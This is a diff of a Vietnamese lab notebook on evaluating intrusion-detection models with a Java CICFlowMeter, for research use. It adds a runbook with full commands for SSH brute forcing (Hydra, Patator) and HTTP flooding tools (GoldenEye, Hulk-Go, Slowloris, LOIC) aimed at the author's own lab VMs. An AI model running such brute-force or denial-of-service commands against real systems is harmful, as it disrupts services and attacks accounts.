@@ -1,5 +1,7 @@
 # Thử CICFlowMeter Java với M0 và M1 (độc lập)
 
+**Tra cứu câu lệnh chạy lại:** tìm mục `SỔ TAY CHẠY LẠI CÁC LƯỢT LAB — 18/11/2026` ở cuối tài liệu. Bao gồm setup, SSH Hydra/Patator, GoldenEye, Hulk-Go, Slowloris, LOIC-HTTP, mức tải và cách lưu PCAP/log.
+
 Mục đích: kiểm tra bản Java V4 trích xuất traffic/PCAP thành flow, rồi cho M0 (15 lớp) và M1 (13 lớp) dự đoán, giải thích riêng trên cùng flow. Tên thư mục giữ từ giai đoạn chỉ thử M0. Khu này có API/UI riêng, không ghi DB hoặc sửa model của RQ3/IDS_M1_Lab. Kết quả Java không tự chứng minh tương thích với bộ train của hai model.
 
 **Kết luận kiểm tra mới nhất 17/11/2026:** đúng là Java trích xuất, nhưng chưa tương thích đầy đủ với bộ train M0 hoặc bộ improved tham chiếu M1. M1 đang dùng trong IDS_M1_Lab đã khác checksum bản M1 nghiên cứu lưu ở RQ4. Trên hai CSV lab cũ do Python xuất, M1 hiện tại trả toàn bộ Benign; không dùng việc ít cảnh báo khi duyệt web để kết luận M1 tốt hơn. Xem mục kiểm tra CSV và ngữ nghĩa đặc trưng cuối tài liệu.
@@ -551,3 +553,231 @@ Chạy `python Java_CICFlowMeter_M0_Trial/test_dataset_ddos.py` trên toàn bộ
 Xuất 100 mẫu ngẫu nhiên cố định seed 42 mỗi lớp tại output/dataset_ddos_test/hoic_test_100.csv và loic_http_test_100.csv; đều nhận đúng 100/100. File có Label để đối chiếu, model chỉ nhận đúng 78 cột feature. Các file *_with_predictions.csv bổ sung nhãn dự đoán để kiểm tra. Nạp dashboard: chọn M0, Nạp CSV / PCAP → CSV, không bật chuyển giây. Mỗi lần nạp thay lượt hiện tại nên dừng capture trước.
 
 Kết quả có checksum model: dataset_ddos_test_20261118.json. Không suy ra traffic live HOIC/LOIC-HTTP cũng đạt tỷ lệ này, không kiểm chứng tính độc lập train/test bằng thử nghiệm này.
+
+## SỔ TAY CHẠY LẠI CÁC LƯỢT LAB — 18/11/2026
+
+Đây là nơi tra cứu tập trung câu lệnh đã dùng/đề xuất trong phiên làm việc. Không cần tạo thêm file MD. Các cấu hình mức 2 là cấu hình đã hướng dẫn; kết quả PCAP mức 2 chưa được xác minh trong mục này. Không coi bản công cụ hiện tại là phiên bản chính xác của dataset. Chỉ chạy trên hai VM lab của mình; không chạy đồng thời nhiều công cụ.
+
+### 1. Máy và chuẩn bị chung
+
+- Kali: dự kiến 192.168.11.133; Ubuntu nạn nhân: 192.168.11.134. Hai VM cùng VMnet1 host-only. Kiểm tra `ip -br addr` mỗi lần; thay IP nếu đã đổi.
+- Windows: dashboard Java và Wireshark cùng bắt VMnet1. Phải thấy traffic Kali ↔ Ubuntu, không chỉ dựa vào ping.
+- Có thể giữ NAT riêng để cài gói; các lệnh thử dưới đây chỉ nhắm IP lab.
+- Ghi giờ có múi giờ bằng `date -Is`; đối chiếu theo UTC nếu hai máy hiển thị giờ khác nhau.
+
+Ubuntu, kiểm tra dịch vụ đã cài:
+
+```bash
+ip -br addr
+sudo systemctl start ssh
+systemctl is-active ssh
+sudo apache2ctl configtest
+sudo systemctl start apache2
+systemctl is-active apache2
+curl -I --max-time 5 http://192.168.11.134/
+```
+
+Nếu chưa cài: `sudo apt update` rồi `sudo apt install -y openssh-server apache2`. Nếu nginx giữ cổng 80, kiểm tra `sudo ss -ltnp 'sport = :80'`; chỉ dừng nginx bằng `sudo systemctl stop nginx` khi chấp nhận tạm ngừng website lab đang dùng nó. Lỗi Apache: `sudo journalctl -u apache2 -n 30 --no-pager`. Không tắt bảo vệ Apache để ép model nhận đúng.
+
+Windows PowerShell, mở dashboard:
+
+```powershell
+cd C:\Users\LOQ\Downloads\SELF_KLTN
+python Java_CICFlowMeter_M0_Trial/launch_dashboard.py
+```
+
+Trước MỖI lượt: Dừng và ghi nốt flow của lượt cũ → chờ finished → chọn M0 hoặc M1 → Realtime → VMnet1 → thời gian 0 → Bắt đầu Java → chờ capturing. Mở Wireshark VMnet1 trước khi chạy công cụ. Radio đổi model không đổi model của capture đang chạy.
+
+Display filter Wireshark (không phải capture filter):
+
+```text
+ip.addr == 192.168.11.133 && ip.addr == 192.168.11.134 && tcp.port == 80
+```
+
+SSH thì thay `80` bằng `22`.
+
+### 2. Cài công cụ trên Kali (chỉ lần đầu)
+
+```bash
+sudo apt update
+sudo apt install -y git python3 curl hydra patator golang-go
+mkdir -p ~/ids-demo
+```
+
+Chỉ clone repo chưa tồn tại:
+
+```bash
+cd ~/ids-demo
+git clone https://github.com/jseidl/GoldenEye.git
+git clone https://github.com/grafov/hulk.git hulk-go
+git clone https://github.com/gkbrk/slowloris.git
+cd ~/ids-demo/hulk-go
+go build -o hulk-lab hulk.go
+```
+
+Lần sau giữ nguyên repo; không tự pull trước khi so các lượt, vì thay commit làm thay công cụ. Ghi `git rev-parse HEAD`. Hulk ở đây là Hulk-Go, Slowloris là bản Python viết lại; chưa xác minh trùng công cụ dataset.
+
+### 3. Hàm ghi log và tự dừng (Kali)
+
+Dán khối này MỖI KHI mở terminal Kali mới. Hàm chỉ ghi log và chạy lệnh được truyền vào; không tự mở capture. Mỗi lượt có timestamp riêng nên không ghi đè log.
+
+```bash
+mkdir -p ~/ids-demo/logs
+run_lab() {
+  local run_label="$1"
+  local run_seconds="$2"
+  shift 2
+  local run_stamp=$(date +%Y%m%d-%H%M%S)
+  {
+    date -Is
+    printf 'label=%s duration_limit=%ss\n' "$run_label" "$run_seconds"
+    printf 'command: '; printf '%s ' "$@"; printf '\n'
+    git rev-parse HEAD 2>/dev/null || true
+    timeout --signal=INT --kill-after=5s "${run_seconds}s" "$@"
+    local run_exit=$?
+    printf 'exit_code=%s\n' "$run_exit"
+    date -Is
+  } 2>&1 | tee "$HOME/ids-demo/logs/${run_label}-${run_stamp}.log"
+}
+```
+
+Exit 124 thường do hết thời gian đã đặt; KeyboardInterrupt khi gửi SIGINT không tự chứng minh công cụ lỗi. Ctrl+C để dừng sớm. kill-after có thể thêm tối đa 5 giây. Đừng dán chạy nối tiếp tất cả các lượt: phải dừng/lưu capture riêng giữa các lượt.
+
+### 4. SSH brute force: Hydra và Patator
+
+Ubuntu dùng tài khoản lab `ids_demo` đã tạo. Nếu chưa có mới chạy `sudo adduser ids_demo`, không thêm quyền sudo. Kiểm tra SSH hợp lệ từ Kali một lần rồi `exit`:
+
+```bash
+ssh ids_demo@192.168.11.134
+```
+
+Kali tạo đúng danh sách 20 mật khẩu sai đã dùng (mật khẩu thật của tài khoản không được trùng danh sách):
+
+```bash
+cd ~/ids-demo
+for i in $(seq 1 20); do
+  printf 'WrongLabPass%02d\n' "$i"
+done > passwords.txt
+```
+
+Hydra, 1 task; thêm giới hạn ngoài 120 giây để không chạy kéo dài:
+
+```bash
+cd ~/ids-demo
+run_lab ssh-hydra 120 hydra -l ids_demo -P passwords.txt -t 1 -W 1 -f -V 192.168.11.134 ssh
+```
+
+Patator, 1 thread, không retry, timeout mỗi lần 10 giây:
+
+```bash
+cd ~/ids-demo
+run_lab ssh-patator 120 patator ssh_login host=192.168.11.134 port=22 user=ids_demo password=FILE0 0=passwords.txt -t 1 --max-retries 0 --timeout 10
+```
+
+Ubuntu kiểm tra: `sudo journalctl -u ssh --since '15 minutes ago' --no-pager`. Phân biệt authentication failed với lỗi transport/session. Đây là các lần thử đăng nhập, không có nghĩa xâm nhập thành công.
+
+### 5. GoldenEye
+
+Mức đầu: 1 worker × 2 socket, 30 giây:
+
+```bash
+cd ~/ids-demo/GoldenEye
+run_lab goldeneye-level1-30s 30 python3 -u goldeneye.py http://192.168.11.134/ -w 1 -s 2 -m get
+```
+
+Lượt 120 giây giữ cùng mức đồng thời (tăng thời lượng, không tăng số worker/socket):
+
+```bash
+cd ~/ids-demo/GoldenEye
+run_lab goldeneye-level1-120s 120 python3 -u goldeneye.py http://192.168.11.134/ -w 1 -s 2 -m get
+```
+
+Mức 2: 2 worker × 5 socket, 30 giây:
+
+```bash
+cd ~/ids-demo/GoldenEye
+run_lab goldeneye-level2-30s 30 python3 -u goldeneye.py http://192.168.11.134/ -w 2 -s 5 -m get
+```
+
+### 6. Hulk-Go
+
+Mức đầu HULKMAXPROCS=3, 30 giây:
+
+```bash
+cd ~/ids-demo/hulk-go
+run_lab hulk-go-level1-30s 30 env HULKMAXPROCS=3 ./hulk-lab -site http://192.168.11.134/
+```
+
+Mức 2 HULKMAXPROCS=6, vẫn 30 giây:
+
+```bash
+cd ~/ids-demo/hulk-go
+run_lab hulk-go-level2-30s 30 env HULKMAXPROCS=6 ./hulk-lab -site http://192.168.11.134/
+```
+
+HULKMAXPROCS là tham số mức đồng thời của công cụ, không phải số request/giây được bảo đảm. Không dùng mặc định lớn. Ghi nhãn kịch bản Hulk-Go dù model trả HOIC; LOIC không chạy được công cụ Hulk.
+
+### 7. Slowloris
+
+Mức đầu 5 socket, khoảng nghỉ 10 giây, tối đa 60 giây:
+
+```bash
+cd ~/ids-demo/slowloris
+run_lab slowloris-level1-60s 60 python3 -u slowloris.py 192.168.11.134 -p 80 -s 5 --sleeptime 10 -v
+```
+
+Mức 2 chỉ tăng lên 10 socket, giữ thời gian và khoảng nghỉ:
+
+```bash
+cd ~/ids-demo/slowloris
+run_lab slowloris-level2-60s 60 python3 -u slowloris.py 192.168.11.134 -p 80 -s 10 --sleeptime 10 -v
+```
+
+Địa chỉ không có http://. Có thể ít flow vì giữ kết nối lâu. HTTP 408/400 cần đối chiếu log/PCAP, không tự kết luận tool chưa chạy. Không tăng thời gian hoặc tắt timeout server chỉ để đạt nhãn mong muốn.
+
+### 8. LOIC-HTTP: giao diện Mono
+
+Cài lần đầu trên Kali:
+
+```bash
+sudo apt install -y git mono-devel mono-xbuild libmono-system-windows-forms4.0-cil libgdiplus
+cd ~/ids-demo
+git clone https://github.com/NewEraCracker/LOIC.git
+cd LOIC/src
+xbuild /p:TargetFrameworkVersion=v4.5
+```
+
+Kho cũ có thể gặp lỗi build trên môi trường mới. Phiên hiện tại đã mở được UI; không cần build lại nếu binary còn đó. Mở lại:
+
+```bash
+cd ~/ids-demo/LOIC
+cp -n src/app.config src/bin/Debug/LOIC.exe.config
+mono src/bin/Debug/LOIC.exe
+```
+
+Chọn Manual Mode, IP 192.168.11.134 → Lock on; Selected target phải đúng IP. Method HTTP, port 80, HTTP Subsite `/`. Lượt đầu: Threads=1, Sockets/Thread=2 nếu áp dụng/cho sửa, Speed kéo phải về slower. Không dùng Hivemind. Sau khi capture sẵn sàng mới bấm nút bắt đầu; bấm Stop flooding THỦ CÔNG sau 30 giây. Timeout=30 trên UI không phải hẹn giờ dừng toàn phiên.
+
+Ảnh người dùng gửi sau đó có Threads=5, Sockets/Thread=25 và thanh tốc độ gần faster. Đây là cấu hình khác mức đầu, không có số request/giây cố định để suy ra từ thanh kéo. Ghi lại ảnh cấu hình đúng lượt; không coi cấu hình đó là thông số dataset hoặc mức mặc định cần chạy lại.
+
+LOIC-HTTP không phải Hulk và không phải HOIC. Chưa có runbook HOIC đã xác minh trong phiên này; không lấy LOIC đổi tên thành HOIC. Một máy Kali chưa tái hiện tính phân tán của DDoS.
+
+### 9. Kết thúc MỖI lượt và lưu bằng chứng
+
+- Công cụ dừng trước; dashboard Dừng và ghi nốt flow → finished; Wireshark Stop → Save As PCAPNG.
+- Đặt tên theo công cụ, mức và thời lượng, ví dụ goldeneye-level2-30s-YYYYMMDD-HHMMSS.pcapng. CSV capture không chứa đầy đủ gói tin để thay PCAP.
+- Ubuntu: xem `sudo tail -f /var/log/apache2/access.log /var/log/apache2/error.log`; dùng `top` theo dõi tài nguyên. Lưu log ngay sau lượt (có thể chứa phiên trước, cần lọc thời gian):
+
+```bash
+run_stamp=$(date +%Y%m%d-%H%M%S)
+sudo tail -n 10000 /var/log/apache2/access.log > "$HOME/apache-access-${run_stamp}.log"
+sudo tail -n 1000 /var/log/apache2/error.log > "$HOME/apache-error-${run_stamp}.log"
+sudo journalctl -u ssh --since '15 minutes ago' --no-pager > "$HOME/ssh-${run_stamp}.log"
+```
+
+Kali đo phản hồi trước/sau lượt HTTP:
+
+```bash
+curl -o /dev/null -sS --max-time 5 -w 'HTTP=%{http_code} time=%{time_total}s\n' http://192.168.11.134/
+```
+
+Nếu VM mất phản hồi thì dừng, chờ phục hồi, không tăng tiếp. Không tự đổi model, cờ TCP hoặc timeout để ép nhãn. Nạp cùng PCAP riêng cho M0/M1 để so profile; không gọi tỷ lệ nhãn trên traffic chưa gán nhãn là accuracy/FPR. Lưu cả kết quả sai/Benign. Số liệu tăng tải cần audit PCAP riêng, không suy từ cấu hình công cụ.
